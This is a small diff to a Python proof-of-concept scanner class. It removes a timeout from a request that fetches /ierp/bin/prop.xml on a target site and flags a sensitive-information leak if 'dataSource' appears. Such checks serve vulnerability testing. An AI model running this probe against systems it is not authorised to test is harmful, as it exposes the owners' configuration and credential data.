@@ -44,7 +44,7 @@ class poc:
     def vuln(self, netloc, scheme):
         url = "{}://{}/ierp/bin/prop.xml".format(scheme, netloc)
         try:
-            result = requests.get(url=url, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.get(url=url, headers=self.headers, verify=False, proxies=self.proxies)
             if result.text.find("dataSource") != -1:
                 target = urlparse(url)
                 self.result_text += """\n        [+]    \033[32m检测到目标站点存在敏感信息泄露漏洞\033[0m
